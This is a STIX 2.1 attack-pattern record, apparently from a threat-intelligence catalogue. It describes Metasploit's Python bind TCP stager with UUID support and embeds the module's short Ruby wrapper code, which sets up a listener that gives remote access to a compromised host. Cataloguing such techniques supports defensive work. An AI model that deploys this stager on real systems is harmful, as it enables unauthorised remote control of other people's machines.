{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2bbcaab2-5dd4-4a46-a899-5e809fad588d",
    "created": "2024-08-14T16:33:19.508054Z",
    "modified": "2024-08-14T16:33:19.508057Z",
    "name": "Python Bind TCP Stager with UUID Support",
    "description": "Listen for a connection with UUID Support",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/python/bind_tcp_uuid.rb",
            "external_id": "bind_tcp_uuid.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Python\n  include Msf::Payload::Python::BindTcp\n\n  def self.handler_type_alias\n    'bind_tcp_uuid'\n  end\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Python Bind TCP Stager with UUID Support',\n      'Description' => 'Listen for a connection with UUID Support',\n      'Author'      => 'OJ Reeves',\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'python',\n      'Arch'        => ARCH_PYTHON,\n      'Handler'     => Msf::Handler::BindTcp,\n      'Stager'      => {'Payload' => \"\"}\n    ))\n  end\n\n  # Tell the reverse_tcp payload to include the UUID\n  def include_send_uuid\n    true\n  end\nend\n",
    "x_mitre_platforms": [
        "python'"
    ]
}